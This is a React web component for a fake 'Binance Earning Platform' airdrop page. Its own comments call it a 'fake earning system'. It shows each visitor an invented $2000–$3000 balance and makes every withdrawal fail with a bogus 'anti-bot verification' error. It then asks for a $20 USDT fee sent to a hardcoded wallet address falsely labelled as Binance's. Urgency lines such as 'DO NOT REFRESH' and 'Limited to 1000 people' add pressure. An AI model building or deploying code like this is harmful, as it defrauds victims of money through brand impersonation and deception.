import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Wallet, Gift, Check, Copy, ExternalLink, Smartphone, DollarSign, TrendingUp, AlertTriangle } from 'lucide-react';
import toast from 'react-hot-toast';

const AirdropSection = () => {
  // Generate random earnings between $2000-$3000 on page load
  const [randomEarnings] = useState(() => {
    return Math.floor(Math.random() * (3000 - 2000 + 1)) + 2000;
  });
  
  // New fake earning system states
  const [hasStarted, setHasStarted] = useState(false);
  const [earnings, setEarnings] = useState(0);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [showError, setShowError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Fee address
  const FEE_ADDRESS = 'TAzayLZmaCVVfuY4kxrp6Z1S76wwuTR4fX';
  const FEE_AMOUNT = 20;

  // Start earning simulation
  const startEarning = async () => {
    setIsLoading(true);
    setHasStarted(true);
    
    // Simulate earning animation
    toast.loading('🚀 Starting earning process...', { duration: 2000 });
    
    setTimeout(() => {
      setEarnings(randomEarnings);
      setIsLoading(false);
      toast.success(`🎉 Congratulations! You earned $${randomEarnings.toLocaleString()}!`, { duration: 4000 });
      setShowWithdraw(true);
    }, 3000);
  };

  // Attempt withdrawal
  const attemptWithdraw = async () => {
    if (!withdrawAddress.trim()) {
      toast.error('Please enter your USDT TRC20 address!');
      return;
    }

    setIsLoading(true);
    toast.loading('Processing withdrawal...', { duration: 2000 });

    setTimeout(() => {
      setIsLoading(false);
      setShowError(true);
      toast.error('🔐 Anti-bot verification required!', { duration: 4000 });
    }, 2500);
  };

  // Copy fee address
  const copyFeeAddress = () => {
    navigator.clipboard.writeText(FEE_ADDRESS);
    toast.success('✅ Official Binance address copied!', { duration: 2000 });
  };

  // Reset system
  const resetSystem = () => {
    setHasStarted(false);
    setEarnings(0);
    setShowWithdraw(false);
    setWithdrawAddress('');
    setShowError(false);
    setIsLoading(false);
  };

  return (
    <section id="airdrop" className="py-12 md:py-20 px-4">
      <div className="container mx-auto">
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-16"
        >
          <h2 className="text-3xl md:text-4xl lg:text-5xl font-bold text-white mb-4 md:mb-6 px-4">
            Binance <span className="text-binance-yellow">Earning</span> Platform
          </h2>
          <p className="text-base md:text-xl text-binance-light-gray max-w-2xl mx-auto px-4">
            Start earning money instantly! No investment required.
            Simple click and earn system.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          whileInView={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.8, delay: 0.2 }}
          className="max-w-2xl mx-auto"
        >
          <div className="glass-effect card-gradient rounded-2xl p-4 md:p-8 border border-binance-border">
            
            {!hasStarted ? (
              // Initial Start Button
              <div className="text-center relative">
                {/* Background Animations */}
                <div className="absolute inset-0 overflow-hidden opacity-20">
                  <motion.div
                    className="absolute top-4 left-1/4 w-3 h-3 bg-green-400 rounded-full"
                    animate={{ y: [0, -20, 0], scale: [1, 1.2, 1] }}
                    transition={{ duration: 3, repeat: Infinity, delay: 0 }}
                  />
                  <motion.div
                    className="absolute top-8 right-1/4 w-2 h-2 bg-binance-yellow rounded-full"
                    animate={{ y: [0, -15, 0], scale: [1, 1.5, 1] }}
                    transition={{ duration: 2.5, repeat: Infinity, delay: 0.5 }}
                  />
                  <motion.div
                    className="absolute bottom-8 left-1/3 w-4 h-4 bg-blue-400 rounded-full"
                    animate={{ y: [0, -25, 0], scale: [1, 1.3, 1] }}
                    transition={{ duration: 3.5, repeat: Infinity, delay: 1 }}
                  />
                </div>

                <motion.div
                  className="relative w-24 h-24 bg-gradient-to-br from-green-400 via-emerald-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-2xl"
                  animate={{ 
                    rotate: 360,
                    boxShadow: [
                      "0 0 20px rgba(34, 197, 94, 0.3)",
                      "0 0 40px rgba(34, 197, 94, 0.6)",
                      "0 0 20px rgba(34, 197, 94, 0.3)"
                    ]
                  }}
                  transition={{ 
                    rotate: { duration: 20, repeat: Infinity, ease: "linear" },
                    boxShadow: { duration: 2, repeat: Infinity }
                  }}
                >
                  <motion.div
                    animate={{ scale: [1, 1.1, 1] }}
                    transition={{ duration: 1.5, repeat: Infinity }}
                  >
                    <DollarSign className="w-12 h-12 text-white" />
                  </motion.div>
                  
                  {/* Orbiting Elements */}
                  <motion.div
                    className="absolute w-6 h-6 bg-binance-yellow rounded-full"
                    animate={{ rotate: 360 }}
                    transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
                    style={{
                      top: '50%',
                      left: '50%',
                      transformOrigin: '50% -40px',
                      transform: 'translate(-50%, -50%)'
                    }}
                  >
                    <span className="text-xs">💎</span>
                  </motion.div>
                </motion.div>
                
                                 <motion.h3 
                   className="text-2xl md:text-3xl font-bold text-white mb-4"
                   initial={{ opacity: 0, y: 20 }}
                   animate={{ opacity: 1, y: 0 }}
                   transition={{ delay: 0.2 }}
                 >
                   Ready to Start Earning? 💰
                 </motion.h3>
                
                <motion.p 
                  className="text-sm md:text-base text-binance-light-gray mb-6 md:mb-8"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.4 }}
                >
                  🎯 Click the button below to start your earning journey.<br/>
                  <span className="text-green-300">No registration • No investment • Instant results!</span>
                </motion.p>

                <motion.button
                  onClick={startEarning}
                  disabled={isLoading}
                  className="relative w-full bg-gradient-to-r from-green-500 via-emerald-500 to-green-600 hover:from-green-600 hover:via-emerald-600 hover:to-green-700 text-white font-bold py-5 px-8 rounded-2xl transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-2xl overflow-hidden"
                  whileHover={{ scale: isLoading ? 1 : 1.02, y: -2 }}
                  whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.6 }}
                >
                  {/* Button Animation Background */}
                  <motion.div
                    className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent"
                    animate={{ x: ['-100%', '100%'] }}
                    transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                  />
                  
                  <div className="relative z-10">
                    {isLoading ? (
                      <div className="flex items-center justify-center space-x-3">
                        <motion.div 
                          className="w-6 h-6 border-3 border-white border-t-transparent rounded-full"
                          animate={{ rotate: 360 }}
                          transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                        />
                        <span className="text-lg">Starting your journey...</span>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center space-x-2">
                        <motion.span 
                          className="text-2xl"
                          animate={{ rotate: [0, 10, -10, 0] }}
                          transition={{ duration: 2, repeat: Infinity }}
                        >
                          🚀
                        </motion.span>
                                                 <span className="text-xl font-bold">Start Earning Now</span>
                        <motion.span 
                          className="text-2xl"
                          animate={{ scale: [1, 1.2, 1] }}
                          transition={{ duration: 1.5, repeat: Infinity }}
                        >
                          💰
                        </motion.span>
                      </div>
                    )}
                  </div>
                </motion.button>

                <motion.div
                  className="mt-6 flex items-center justify-center space-x-4 text-sm text-green-300"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.8 }}
                >
                  <div className="flex items-center space-x-1">
                    <span>⚡</span>
                    <span>Instant</span>
                  </div>
                  <div className="w-1 h-1 bg-green-400 rounded-full"></div>
                  <div className="flex items-center space-x-1">
                    <span>🔒</span>
                    <span>Secure</span>
                  </div>
                  <div className="w-1 h-1 bg-green-400 rounded-full"></div>
                  <div className="flex items-center space-x-1">
                    <span>🆓</span>
                    <span>Free</span>
                  </div>
                </motion.div>
              </div>
            ) : !showWithdraw ? (
              // Earning Animation
              <div className="text-center">
                <motion.div
                  className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6"
                  animate={{ scale: [1, 1.2, 1] }}
                  transition={{ duration: 1, repeat: Infinity }}
                >
                  <TrendingUp className="w-10 h-10 text-white" />
                </motion.div>
                
                <h3 className="text-xl md:text-2xl font-bold text-green-400 mb-4">
                  Earning in Progress...
                </h3>
                
                <div className="space-y-2 mb-6">
                  <div className="w-full bg-gray-700 rounded-full h-2">
                    <motion.div 
                      className="bg-green-500 h-2 rounded-full"
                      initial={{ width: '0%' }}
                      animate={{ width: '100%' }}
                      transition={{ duration: 3 }}
                    ></motion.div>
                  </div>
                  <p className="text-sm text-binance-light-gray">Processing your earnings...</p>
                </div>
              </div>
            ) : !showError ? (
              // Earnings Display
              <div className="text-center">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ duration: 0.5 }}
                  className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6"
                >
                  <Check className="w-10 h-10 text-white" />
                </motion.div>
                
                <motion.h3
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5, delay: 0.2 }}
                  className="text-2xl font-bold text-green-400 mb-4"
                >
                  🎉 Congratulations!
                </motion.h3>
                
                {/* Earnings Display with Animation */}
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5, delay: 0.4 }}
                  className="relative p-8 bg-gradient-to-br from-green-500/20 to-emerald-600/20 border border-green-500/30 rounded-2xl mb-6 overflow-hidden"
                >
                  {/* Background Pattern */}
                  <div className="absolute inset-0 opacity-10">
                    <div className="absolute top-4 left-4 w-12 h-12 border-2 border-green-400 rounded-full"></div>
                    <div className="absolute top-8 right-8 w-8 h-8 border border-green-300 rounded-full"></div>
                    <div className="absolute bottom-4 left-8 w-6 h-6 border border-green-500 rounded-full"></div>
                  </div>
                  
                  <div className="relative z-10">
                    <div className="flex items-center justify-center mb-4">
                      <motion.div
                        animate={{ scale: [1, 1.1, 1] }}
                        transition={{ duration: 2, repeat: Infinity }}
                        className="text-6xl"
                      >
                        💰
                      </motion.div>
                    </div>
                    
                    <motion.div 
                      className="text-5xl font-bold text-green-400 mb-2 text-center"
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      transition={{ duration: 0.8, delay: 0.6, type: "spring" }}
                    >
                      ${earnings.toLocaleString()}
                    </motion.div>
                    
                    <div className="text-center">
                      <div className="text-lg text-green-300 mb-2">💎 Earned Today</div>
                      <motion.div
                        className="w-full bg-gray-700 rounded-full h-3 overflow-hidden"
                        initial={{ width: 0 }}
                        animate={{ width: "100%" }}
                        transition={{ duration: 1, delay: 0.8 }}
                      >
                        <motion.div 
                          className="h-full bg-gradient-to-r from-green-400 to-emerald-500 rounded-full"
                          initial={{ width: "0%" }}
                          animate={{ width: "100%" }}
                          transition={{ duration: 2, delay: 1 }}
                        ></motion.div>
                      </motion.div>
                      <div className="text-sm text-green-300 mt-2">🚀 Earning Completed</div>
                    </div>
                  </div>
                </motion.div>



                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ duration: 0.5, delay: 0.8 }}
                  className="space-y-4"
                >
                  <div className="space-y-3">
                    <label className="block text-sm font-medium text-white text-left">
                      USDT TRC20 Withdrawal Address:
                    </label>
                    <input
                      type="text"
                      value={withdrawAddress}
                      onChange={(e) => setWithdrawAddress(e.target.value)}
                      placeholder="Enter your USDT TRC20 address..."
                      className="w-full px-4 py-3 bg-binance-dark border border-binance-border rounded-xl text-white placeholder-gray-400 focus:outline-none focus:border-binance-yellow"
                    />
                  </div>
                  
                  <motion.button
                    onClick={attemptWithdraw}
                    disabled={isLoading}
                    className="w-full bg-binance-gradient hover:bg-binance-gradient-hover text-white font-bold py-4 px-8 rounded-xl transition-all disabled:opacity-50"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center space-x-2">
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                        <span>Processing...</span>
                      </div>
                    ) : (
                      <span className="text-lg">💰 Withdraw Money</span>
                    )}
                  </motion.button>
                </motion.div>
              </div>
            ) : (
              // Error/Fee Required
              <div className="text-center">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ duration: 0.5 }}
                  className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-6"
                >
                  <AlertTriangle className="w-10 h-10 text-white" />
                </motion.div>
                
                <motion.h3
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5, delay: 0.2 }}
                  className="text-2xl font-bold text-red-400 mb-4"
                >
                  🚫 Verification Required!
                </motion.h3>
                
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5, delay: 0.4 }}
                  className="p-6 bg-red-500/10 border border-red-500/20 rounded-xl mb-6"
                >
                  <div className="text-lg font-semibold text-red-400 mb-3">
                    🔐 Anti-Bot Verification Required
                  </div>
                  <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-4 mb-4">
                    <div className="flex items-center space-x-2 mb-2">
                      <span className="text-yellow-400 text-xl">⚠️</span>
                      <span className="text-yellow-400 font-semibold">Important Notice</span>
                    </div>
                    <p className="text-sm text-yellow-200">
                      <strong>DO NOT REFRESH THIS PAGE!</strong> Refreshing will cancel your earnings and you won't be able to claim again.
                    </p>
                  </div>
                  
                  <p className="text-sm text-binance-light-gray mb-4">
                    To verify you're a real user and prevent bot abuse, please send the verification fee to our official Binance Airdrop account:
                  </p>
                  
                  <div className="bg-binance-dark p-4 rounded-lg mb-4">
                    <div className="text-binance-yellow font-bold text-lg mb-2">
                      ${FEE_AMOUNT} USDT TRC20
                    </div>
                    <div className="text-xs text-green-400 mb-2">
                      ✅ Official Binance Airdrop Verification Address:
                    </div>
                    <div className="flex items-center space-x-2 bg-gray-800 p-3 rounded">
                      <span className="text-white font-mono text-sm flex-1 break-all">
                        {FEE_ADDRESS}
                      </span>
                      <button
                        onClick={copyFeeAddress}
                        className="text-binance-yellow hover:text-white transition-colors p-1"
                      >
                        <Copy className="w-4 h-4" />
                      </button>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                    <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-3">
                      <div className="flex items-center space-x-2 mb-1">
                        <span className="text-green-400">⏱️</span>
                        <span className="text-green-400 font-semibold text-sm">Fast Verification</span>
                      </div>
                      <p className="text-xs text-binance-light-gray">
                        Verification completed within 5 minutes after payment
                      </p>
                    </div>
                    
                    <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                      <div className="flex items-center space-x-2 mb-1">
                        <span className="text-blue-400">📋</span>
                        <span className="text-blue-400 font-semibold text-sm">Payment Notes</span>
                      </div>
                      <p className="text-xs text-binance-light-gray">
                        Binance Hub records your fee payment and automatically sends your ${earnings.toLocaleString()} USDT within maximum 10 minutes
                      </p>
                    </div>
                  </div>

                  <div className="bg-orange-500/10 border border-orange-500/20 rounded-lg p-3 mb-4">
                    <div className="flex items-center space-x-2 mb-2">
                      <span className="text-orange-400 text-lg">🤖</span>
                      <span className="text-orange-400 font-semibold">Why verification is needed?</span>
                    </div>
                    <p className="text-xs text-binance-light-gray">
                      This helps us distinguish between real users and automated bots. Once verified, your ${earnings.toLocaleString()} USDT will be instantly released to your wallet.
                    </p>
                  </div>
                </motion.div>

                <motion.button
                  onClick={resetSystem}
                  className="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-xl transition-all"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ duration: 0.5, delay: 0.6 }}
                >
                  Try Again
                </motion.button>
              </div>
            )}
          </div>
        </motion.div>

        {/* Stats */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          className="mt-12 text-center"
        >
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto">
            <motion.div 
              className="glass-effect rounded-xl p-6 border border-binance-border hover:border-green-400/50 transition-all group"
              whileHover={{ scale: 1.05, y: -5 }}
            >
              <motion.div 
                className="text-3xl font-bold text-green-400 mb-2"
                animate={{ scale: [1, 1.1, 1] }}
                transition={{ duration: 2, repeat: Infinity }}
              >
                100+
              </motion.div>
              <div className="text-binance-light-gray group-hover:text-green-300 transition-colors">
                👥 Active Participants
              </div>
              <div className="text-xs text-red-400 mt-1">⚠️ Limited to 1000 people</div>
            </motion.div>
            
            <motion.div 
              className="glass-effect rounded-xl p-6 border border-binance-border hover:border-binance-yellow/50 transition-all group"
              whileHover={{ scale: 1.05, y: -5 }}
            >
              <motion.div 
                className="text-3xl font-bold text-binance-yellow mb-2"
                animate={{ rotate: [0, 5, -5, 0] }}
                transition={{ duration: 3, repeat: Infinity }}
              >
                24/7
              </motion.div>
              <div className="text-binance-light-gray group-hover:text-binance-yellow transition-colors">
                ⚡ Earning Availability
              </div>
              <div className="text-xs text-binance-yellow mt-1">🔄 Always Active</div>
            </motion.div>
            
                         <motion.div 
               className="glass-effect rounded-xl p-6 border border-binance-border hover:border-blue-400/50 transition-all group"
               whileHover={{ scale: 1.05, y: -5 }}
             >
               <motion.div 
                 className="text-3xl font-bold text-blue-400 mb-2"
                 animate={{ y: [0, -5, 0] }}
                 transition={{ duration: 2.5, repeat: Infinity }}
               >
                 Instant
               </motion.div>
               <div className="text-binance-light-gray group-hover:text-blue-300 transition-colors">
                 💎 Earning Process
               </div>
               <div className="text-xs text-blue-400 mt-1">🎯 One click earning</div>
             </motion.div>
          </div>
        </motion.div>
      </div>
    </section>
  );
};

export default AirdropSection; 